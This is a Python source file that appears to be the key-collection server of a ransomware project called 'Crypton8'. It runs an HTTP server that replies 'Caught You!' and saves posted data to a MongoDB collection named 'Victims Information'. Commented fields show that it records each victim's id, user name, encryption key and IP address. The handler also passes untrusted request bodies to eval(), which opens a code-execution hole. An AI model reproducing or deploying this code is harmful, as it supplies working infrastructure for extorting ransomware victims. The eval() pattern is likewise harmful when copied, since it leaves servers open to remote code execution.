# You can either opt for mongodb atlas storage solution or store data in your local system.
# In case you are opting for mongodb atlas, then create an account for it, and pass the url
# of your mongo cluster in connection_string variable.
# In case you are opting for local storage, then download mongo server on your local system,
# start it on your computer and pass the url of the server in connection_string
# default mongo server is at https://localhost:27017 .



import pymongo
from http.server import BaseHTTPRequestHandler, HTTPServer


# ----------------> Basic Connection oriented configs. <---------------- #

def connect():

    connection_string = "CONNECTION_URL_HERE"     # creates the connection url
    client = pymongo.MongoClient(connection_string)     # creates the client

    return client["Crypton8"]   # creates a database named Crypton8


# ----------------------------------------------------------------------- #


db = connect()  # creates a database named Crypton8
collection = db["Victims Information"]  # creates a collection inside Crypton8 database


class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200, "Connected Successfully")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Caught You!")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length)
        data = data.decode("utf-8")
        data = eval(data)   # converting string to dict.
        # id = data["uniqueId"]
        # user = data["user"]
        # key = data["key"]
        # ip = data["ip"]
        self.send_response(200)
        self.end_headers()
        collection.insert_one(data)
        

if __name__ == "__main__":
  
    WebServer = HTTPServer(("localhost", 8000), Server)
    WebServer.serve_forever()
    
